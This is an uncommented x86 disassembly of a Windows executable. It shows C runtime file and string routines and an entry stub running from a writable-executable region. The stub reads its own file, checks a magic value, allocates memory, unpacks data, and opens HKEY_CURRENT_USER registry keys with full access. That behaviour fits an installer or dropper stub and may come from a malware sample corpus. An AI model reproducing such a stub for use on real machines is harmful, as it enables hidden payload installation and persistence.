add [ ebp - 0xc ] edx
lea ecx [ eax + esi + 0x4 ]
mov al [ ecx ]
test al al
jns r-xdata
call [ GetLastError@IAT ]
push 0x5
pop ecx
cmp eax ecx
jne r-xdata
dec [ ebp + 0x10 ]
mov [ edi ] al
mov eax [ ebx ]
lea ecx [ edi + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ eax + esi + 0x5 ] 0xa
mov eax [ ebp - 0xc ]
jmp r-xdata
test edx edx
je r-xdata
cmp eax 0x6d
jne r-xdata
mov [ rw-data ] ecx
jmp r-xdata
and al 0xfb
cmp [ edi ] 0xa
jne r-xdata
push eax
call sub_430ea3
pop ecx
jmp r-xdata
mov [ rw-data ] 0x9
sub edi [ ebp + 0xc ]
mov [ ebp - 0xc ] edi
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x1a
je r-xdata
or al 0x4
jmp r-xdata
or eax 0xffffffff
mov eax [ ebx ]
lea esi [ eax + esi + 0x4 ]
mov al [ esi ]
test al 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov [ ecx ] al
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
add ecx eax
cmp eax ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
jae r-xdata
or al 0x2
mov [ esi ] al
dec ecx
cmp [ ebp - 0x8 ] ecx
jae r-xdata
mov [ edi ] al
inc edi
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebp - 0x8 ]
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ ebx ]
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
inc eax
cmp [ eax ] 0xa
jne r-xdata
mov ecx [ ebp - 0xc ]
cmp [ ebp - 0x8 ] ecx
jb r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
add [ ebp - 0x8 ] 0x2
jmp r-xdata
jmp r-xdata
mov [ edi ] 0xd
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x48
je r-xdata
mov [ edi ] 0xa
jmp r-xdata
cmp edi [ ebp + 0xc ]
jne r-xdata
mov al [ ebp - 0x1 ]
cmp al 0xa
je r-xdata
inc edi
push 0x1
push 0xffffffff
push [ ebp + 0x8 ]
call sub_42f6c4
add esp 0xc
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
jne r-xdata
mov [ edi ] 0xd
mov ecx [ ebx ]
mov [ ecx + esi + 0x5 ] al
jmp r-xdata
sub_43153d
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
mov [ ebp + 0xb ] cl
pop edi
jne r-xdata
mov eax [ rw-data ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
leave
retn
push 0x8
push ecx
call sub_42c0a8
pop ecx
pop ecx
leave
retn
push 0x1
push [ rw-data ]
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push eax
push 0x2
lea eax [ ebp + 0xa ]
push eax
push 0x1
call sub_42ed46
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
xor eax eax
inc eax
leave
retn
sub_4315cd
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
xor eax eax
xor ecx ecx
mov cx [ ebx + 0xa ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov ax [ esi + 0xa ]
push edi
mov edi ecx
mov edx 0x7fff
and ecx edx
xor edi eax
and eax edx
and edi 0x8000
cmp ax 0x7fff
lea edx [ ecx + eax ]
mov [ ebp + 0x8 ] edx
jae r-xdata
neg di
sbb edi edi
and [ esi + 0x4 ] 0x0
and edi 0x80000000
add edi 0x7fff8000
and [ esi ] 0x0
mov [ esi + 0x8 ] edi
cmp cx 0x7fff
jae r-xdata
cmp dx 0xbffd
ja r-xdata
cmp dx 0x3fbf
ja r-xdata
test ax ax
mov edx 0x7fffffff
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc [ ebp + 0x8 ]
xor eax eax
test [ esi + 0x8 ] edx
jne r-xdata
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi ] eax
jmp r-xdata
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x8 ] eax
mov [ ebp + 0xc ] 0x5
inc [ ebp + 0x8 ]
test [ ebx + 0x8 ] edx
jne r-xdata
cmp cx ax
jne r-xdata
cmp [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_42fac0
leave
retn
add [ ebp - 0x8 ] 0x2
inc [ ebp - 0x14 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
add eax esi
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
lea ecx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0x4 ] eax
jne r-xdata
cmp [ esi ] eax
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax eax
cmp [ ebp + 0xc ] 0x0
jle r-xdata
add [ ebp + 0x8 ] 0xc002
cmp [ ebp + 0x8 ] 0x0
jle r-xdata
add [ ebp - 0xc ] 0x2
sub [ ebp - 0x10 ] 0x2
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax ]
cmp [ ebx ] eax
jne r-xdata
jmp r-xdata
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
jge r-xdata
test [ ebp - 0x1d ] 0x80
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
movzx ecx [ ecx ]
movzx eax [ eax ]
imul eax ecx
mov ecx [ ebp - 0x8 ]
add ecx 0xfffffffc
push ecx
push eax
push [ ecx ]
call sub_4305c4
add esp 0xc
test eax eax
je r-xdata
mov [ esi + 0xa ] ax
jmp r-xdata
cmp [ ebp - 0x28 ] 0x8000
ja r-xdata
mov eax [ ebp + 0x8 ]
neg eax
movzx ebx ax
add [ ebp + 0x8 ] ebx
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_430643
add [ ebp + 0x8 ] 0xffff
cmp [ ebp + 0x8 ] 0x0
pop ecx
jg r-xdata
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x28 ]
and eax 0x1ffff
cmp eax 0x18000
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call sub_430671
dec ebx
pop ecx
jne r-xdata
inc [ ebp - 0x18 ]
inc [ ebp - 0x26 ]
and [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x22 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp ax 0x7fff
jae r-xdata
test [ ebp - 0x28 ] 0x1
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov cx [ ebp - 0x26 ]
mov [ esi ] cx
mov ecx [ ebp - 0x24 ]
mov [ esi + 0x2 ] ecx
mov ecx [ ebp - 0x20 ]
mov [ esi + 0x6 ] ecx
or eax edi
inc [ ebp - 0x22 ]
jmp r-xdata
and [ ebp - 0x22 ] 0x0
cmp [ ebp - 0x1e ] 0xffff
jne r-xdata
or [ ebp - 0x28 ] 0x1
inc [ ebp - 0x1e ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov [ ebp - 0x1e ] 0x8000
jmp r-xdata
sub_431805
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx rw-data
xor ecx ecx
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop ebx
call sub_42fac0
leave
retn
jge r-xdata
cmp [ ebp + 0x10 ] ecx
jne r-xdata
neg [ ebp + 0xc ]
mov ebx rw-data
sub ebx 0x60
cmp [ ebp + 0xc ] ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] cx
push esi
push edi
cmp [ ebp + 0xc ] ecx
jne r-xdata
lea eax [ eax + eax * 2 ]
lea esi [ ebx + eax * 4 ]
cmp [ esi ] 0x8000
jb r-xdata
mov eax [ ebp + 0xc ]
sar [ ebp + 0xc ] 0x3
and eax 0x7
add ebx 0x54
cmp eax ecx
je r-xdata
pop edi
pop esi
push esi
push [ ebp + 0x8 ]
call sub_4315cd
pop ecx
pop ecx
xor ecx ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0xe ]
lea esi [ ebp - 0x10 ]
sub_431891
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
push edi
or edi 0xffffffff
test al 0x40
je r-xdata
test al 0x83
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax edi
push esi
call sub_4310af
push esi
mov edi eax
call sub_4319f1
push [ esi + 0x10 ]
call sub_43193e
add esp 0xc
test eax eax
jge r-xdata
and [ esi + 0xc ] 0x0
pop edi
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_429931
and [ esi + 0x1c ] 0x0
pop ecx
sub_4318e7
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov edx eax
and edx 0x1f
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_430f7c
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_43193e
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
cmp edi [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
shl esi 0x3
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push edi
call sub_430f7c
cmp eax 0xffffffff
pop ecx
je r-xdata
xor ebp ebp
cmp edi 0x1
je r-xdata
xor eax eax
jmp r-xdata
push ebp
call sub_430ea3
pop ecx
jmp r-xdata
push 0x2
call sub_430f7c
push 0x1
mov ebp eax
call sub_430f7c
cmp eax ebp
pop ecx
pop ecx
je r-xdata
cmp edi 0x2
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
or eax 0xffffffff
push edi
call sub_430f7c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebp eax
jmp r-xdata
push edi
call sub_430f02
mov eax [ ebx ]
and [ eax + esi + 0x4 ] 0x0
test ebp ebp
pop ecx
je r-xdata
sub_4319f1
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_429931
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_431a26
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_42daa0
inc eax
push eax
call sub_429a56
test eax eax
pop ecx
pop ecx
je r-xdata
push esi
push eax
call sub_42f2b0
pop ecx
pop ecx
pop esi
retn
sub_431a51
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
pop ebp
jmp sub_431af0
pop edi
mov eax ebx
pop esi
sub eax ecx
pop ebx
pop ebp
retn
test ebx ebx
je r-xdata
cmp ebx ecx
je r-xdata
movzx eax [ esi ]
push eax
call sub_429b24
mov ebx eax
movzx eax [ edi ]
push eax
inc esi
call sub_429b24
pop ecx
inc edi
dec [ ebp + 0x10 ]
pop ecx
mov ecx eax
je r-xdata
sub_431aa6
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
jmp sub_431b60
pop edi
mov eax ebx
pop esi
sub eax ecx
pop ebx
retn
cmp ebx ecx
je r-xdata
movzx eax [ esi ]
push eax
call sub_429b24
mov ebx eax
movzx eax [ edi ]
push eax
inc esi
call sub_429b24
pop ecx
inc edi
test ebx ebx
pop ecx
mov ecx eax
je r-xdata
sub_431af0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_431b60
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov al 0xff
mov edi edi
movsx eax al
pop ebx
pop esi
pop edi
leave
retn
mov al [ esi ]
add esi 0x1
mov ah [ edi ]
add edi 0x1
cmp ah al
je r-xdata
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
sbb al al
sbb al 0xff
_start
push ebp
mov ebp esp
sub esp 0x574
mov [ ebp - 0x12c ] 0x0
mov [ ebp - 0x154 ] 0x0
mov [ ebp - 0x284 ] 0x0
call sub_45c27d
nop
nop
pop [ ebp - 0x12c ]
mov eax [ ebp - 0x12c ]
sub eax 0x24c
mov [ ebp - 0x284 ] eax
mov [ ebp - 0x540 ] 0x0
mov [ ebp - 0x2a8 ] 0x0
mov [ ebp - 0x420 ] 0x0
mov [ ebp - 0x144 ] 0x0
mov ecx [ ebp - 0x284 ]
mov edx [ ecx ]
mov [ ebp - 0x420 ] edx
mov eax [ ebp - 0x284 ]
add eax 0x4
mov [ ebp - 0x140 ] eax
mov ecx [ ebp - 0x140 ]
push ecx
call sub_45cf70
add esp 0x4
call sub_45d130
mov [ ebp - 0x54c ] eax
mov edx [ ebp - 0x140 ]
push edx
mov eax [ ebp - 0x54c ]
push eax
call sub_45d160
add esp 0x8
mov [ ebp - 0x540 ] eax
mov ecx [ ebp - 0x284 ]
mov edx [ ecx + 0x1c ]
mov [ ebp - 0x144 ] edx
mov [ ebp - 0x548 ] 0x0
mov [ ebp - 0x53c ] 0x0
mov eax [ ebp - 0x284 ]
add eax 0xa0
mov [ ebp - 0x2a4 ] eax
mov ecx [ ebp - 0x284 ]
add ecx 0x1f0
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x284 ]
add edx 0xd0
mov [ ebp - 0x128 ] edx
mov [ ebp - 0x124 ] 0x0
mov [ ebp - 0x150 ] 0x0
mov eax [ ebp - 0x12c ]
sub eax 0x1
mov [ ebp - 0x12c ] eax
mov ecx [ ebp - 0x12c ]
mov edx [ ecx ]
mov [ ebp - 0x154 ] edx
jmp rwxdata
mov [ ebp - 0x2a0 ] 0x0
mov [ ebp - 0x41c ] 0x0
mov [ ebp - 0x418 ] 0x0
mov [ ebp - 0x13c ] 0x0
mov [ ebp - 0x14c ] 0x0
mov [ ebp - 0x29c ] 0x0
mov [ ebp - 0x538 ] 0x0
mov [ ebp - 0x544 ] 0x0
mov [ ebp - 0x280 ] 0x0
mov [ ebp - 0x28c ] 0x0
mov [ ebp - 0x55c ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x534 ] 0x0
mov [ ebp - 0x268 ] 0x0
mov [ ebp - 0x414 ] 0x0
mov [ ebp - 0x298 ] 0x0
mov edx [ ebp - 0x284 ]
add edx 0x1f0
mov [ ebp - 0x124 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax ]
mov [ ebp - 0x2a0 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x41c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x418 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0x13c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x29c ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x538 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x544 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x20 ]
mov [ ebp - 0x280 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x28c ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x28 ]
mov [ ebp - 0x55c ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x30 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x534 ] eax
mov ecx [ ebp - 0x124 ]
mov edx [ ecx + 0x38 ]
mov [ ebp - 0x268 ] edx
mov eax [ ebp - 0x124 ]
mov ecx [ eax + 0x3c ]
mov [ ebp - 0x414 ] ecx
mov edx [ ebp - 0x124 ]
mov eax [ edx + 0x40 ]
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x264 ] 0x0
mov ecx [ ebp - 0x284 ]
add ecx 0x20
mov [ ebp - 0x264 ] ecx
mov [ ebp - 0x2b4 ] 0x0
mov [ ebp - 0x18 ] 0x0
push 0x103
lea edx [ ebp - 0x120 ]
push edx
push 0x0
call [ ebp - 0x41c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
lea eax [ ebp - 0x120 ]
push eax
call [ ebp - 0x418 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
je rwxdata
mov eax [ ebp - 0x548 ]
push eax
call [ ebp - 0x540 ]
mov [ ebp - 0x150 ] eax
cmp [ ebp - 0x150 ] 0x0
jne rwxdata
cmp [ ebp - 0x154 ] 0x652a5e26
je rwxdata
call [ ebp - 0x420 ]
xor eax eax
mov esp ebp
pop ebp
retn
push 0x0
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x14c ]
mov [ ebp - 0x288 ] eax
cmp [ ebp - 0x288 ] 0xc800000
ja rwxdata
mov ecx [ ebp - 0x128 ]
mov [ ebp - 0x53c ] ecx
mov edx [ ebp - 0x53c ]
movsx eax [ edx ]
test eax eax
je rwxdata
jmp rwxdata
mov ecx [ ebp - 0xc ]
push ecx
call [ ebp - 0x13c ]
push 0x4
push 0x1000
mov edx [ ebp - 0x288 ]
push edx
push 0x0
call [ ebp - 0x29c ]
mov [ ebp - 0x294 ] eax
cmp [ ebp - 0x294 ] 0x0
je rwxdata
mov edx [ ebp - 0x128 ]
add edx 0x5
mov [ ebp - 0x128 ] edx
mov eax [ ebp - 0x548 ]
mov [ ebp - 0x570 ] eax
mov [ ebp - 0x56c ] 0x0
mov ecx [ ebp - 0x53c ]
push ecx
mov edx [ ebp - 0x150 ]
push edx
call sub_45d160
add esp 0x8
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x560 ] 0x4
push 0x0
lea eax [ ebp - 0x550 ]
push eax
mov ecx [ ebp - 0x288 ]
push ecx
mov edx [ ebp - 0x294 ]
push edx
mov eax [ ebp - 0xc ]
push eax
call [ ebp - 0x544 ]
mov ecx [ ebp - 0x550 ]
mov edx [ ebp - 0x294 ]
lea eax [ edx + ecx - 0x3 ]
mov [ ebp - 0x148 ] eax
jmp rwxdata
mov edx [ ebp - 0x56c ]
mov eax [ ebp - 0x2a4 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x2a4 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x570 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x570 ]
add eax 0x1
mov [ ebp - 0x570 ] eax
test edx edx
je rwxdata
mov edx [ ebp - 0x14 ]
add edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x53c ]
mov [ ebp - 0x568 ] eax
mov [ ebp - 0x564 ] 0x0
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x560 ]
mov eax [ ebp - 0x560 ]
mov cl [ ebp + eax - 0x124 ]
mov [ edx ] cl
jmp rwxdata
mov edx [ ebp - 0x148 ]
cmp edx [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x2a4 ]
mov [ ebp - 0x548 ] eax
mov ecx [ ebp - 0x548 ]
movsx edx [ ecx ]
test edx edx
je rwxdata
mov ecx [ ebp - 0x56c ]
add ecx 0x1
mov [ ebp - 0x56c ] ecx
jmp rwxdata
mov edx [ ebp - 0x564 ]
mov eax [ ebp - 0x128 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x128 ] ecx
jmp rwxdata
mov ecx [ ebp - 0x568 ]
movsx edx [ ecx ]
mov eax [ ebp - 0x568 ]
add eax 0x1
mov [ ebp - 0x568 ] eax
test edx edx
je rwxdata
mov eax [ ebp - 0x560 ]
mov ecx [ ebp - 0x560 ]
sub ecx 0x1
mov [ ebp - 0x560 ] ecx
test eax eax
je rwxdata
mov eax [ ebp - 0x148 ]
cmp eax [ ebp - 0x294 ]
jbe rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x36
jne rwxdata
cmp [ ebp - 0x570 ] 0x0
je rwxdata
mov ecx [ ebp - 0x564 ]
add ecx 0x1
mov [ ebp - 0x564 ] ecx
jmp rwxdata
push 0x8000
push 0x0
mov eax [ ebp - 0x294 ]
push eax
call [ ebp - 0x538 ]
mov ecx [ ebp - 0x148 ]
add ecx 0x4
mov [ ebp - 0x148 ] ecx
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x148 ]
movsx eax [ edx + 0x1 ]
cmp eax 0x2a
jne rwxdata
cmp [ ebp - 0x568 ] 0x0
je rwxdata
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx ]
cmp edx 0x3a
je rwxdata
mov ecx [ ebp - 0x148 ]
sub ecx 0x1
mov [ ebp - 0x148 ] ecx
mov ecx [ ebp - 0x148 ]
movsx edx [ ecx + 0x2 ]
cmp edx 0x23
jne rwxdata
mov edx [ ebp - 0x130 ]
sub edx 0x1
mov [ ebp - 0x554 ] edx
jmp rwxdata
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x120 ] dl
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x2e
jne rwxdata
jmp rwxdata
mov ecx [ ebp - 0x554 ]
movsx edx [ ebp + ecx - 0x120 ]
cmp edx 0x2e
je rwxdata
jmp rwxdata
mov [ ebp - 0x554 ] 0x0
jmp rwxdata
mov [ ebp - 0x2b0 ] 0x0
mov eax [ ebp - 0x554 ]
add eax 0x1
mov [ ebp - 0x554 ] eax
jmp rwxdata
jmp rwxdata
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
cmp eax [ ebp - 0x130 ]
jae rwxdata
mov eax [ ebp - 0x554 ]
sub eax 0x1
mov [ ebp - 0x554 ] eax
mov ecx [ ebp - 0x554 ]
mov [ ebp + ecx - 0x260 ] 0x0
lea edx [ ebp - 0x260 ]
push edx
call sub_45cf70
add esp 0x4
push 0x104
lea eax [ ebp - 0x260 ]
push eax
call [ ebp - 0x8 ]
push 0x0
lea ecx [ ebp - 0x260 ]
push ecx
call [ ebp - 0x280 ]
mov ecx [ ebp - 0x554 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov [ ebp + ecx - 0x260 ] 0x0
mov edx [ ebp - 0x130 ]
mov [ ebp + edx - 0x120 ] 0x0
lea eax [ ebp - 0x120 ]
push eax
call sub_45cf70
add esp 0x4
lea ecx [ ebp - 0x260 ]
push ecx
call sub_45cf70
add esp 0x4
push 0x104
lea edx [ ebp - 0x120 ]
push edx
call [ ebp - 0x8 ]
mov eax [ ebp - 0x148 ]
add eax 0x1
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x130 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x2b0 ]
mov edx [ ebp - 0x554 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x260 ] al
jmp rwxdata
mov edx [ ebp - 0x554 ]
add edx 0x1
mov [ ebp - 0x554 ] edx
mov edx [ ebp - 0x130 ]
movsx eax [ ebp + edx - 0x120 ]
test eax eax
je rwxdata
mov ecx [ ebp - 0x554 ]
add ecx 0x1
mov [ ebp - 0x554 ] ecx
mov edx [ ebp - 0x2b0 ]
add edx 0x1
mov [ ebp - 0x2b0 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x20
mov edx [ ebp - 0x130 ]
add edx 0x1
mov [ ebp - 0x130 ] edx
mov eax [ ebp - 0x130 ]
mov [ ebp + eax - 0x530 ] 0x2f
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x290 ] 0x0
jmp rwxdata
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x130 ]
mov al [ ebp + edx - 0x120 ]
mov [ ebp + ecx - 0x530 ] al
jmp rwxdata
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
cmp ecx 0x26
je rwxdata
mov ecx [ ebp - 0x130 ]
add ecx 0x1
mov [ ebp - 0x130 ] ecx
mov ecx [ ebp - 0x130 ]
mov [ ebp + ecx - 0x530 ] 0x0
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x264 ]
push eax
call sub_45cf70
add esp 0x4
mov ecx [ ebp - 0x144 ]
and ecx 0x1
je rwxdata
mov edx [ ebp - 0x290 ]
imul edx edx 0xa
mov eax [ ebp - 0x148 ]
movsx ecx [ eax ]
lea edx [ edx + ecx - 0x30 ]
mov [ ebp - 0x290 ] edx
mov eax [ ebp - 0x130 ]
mov ecx [ ebp - 0x148 ]
mov dl [ ecx ]
mov [ ebp + eax - 0x530 ] dl
mov eax [ ebp - 0x130 ]
add eax 0x1
mov [ ebp - 0x130 ] eax
jmp rwxdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
jae rwxdata
mov edx [ ebp - 0x144 ]
and edx 0x10
je rwxdata
mov edx [ ebp - 0x148 ]
add edx 0x1
mov [ ebp - 0x148 ] edx
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x290 ]
ja rwxdata
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
call sub_45cf70
add esp 0x4
lea edx [ ebp - 0x27c ]
push edx
lea eax [ ebp - 0x138 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x264 ]
add ecx 0x30
push ecx
push 0x80000001
call [ ebp - 0x4 ]
mov [ ebp - 0x2b4 ] eax
cmp [ ebp - 0x2b4 ] 0x0
jne rwxdata
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov edx [ ebp - 0x264 ]
push edx
push 0x80000001
call [ ebp - 0x4 ]
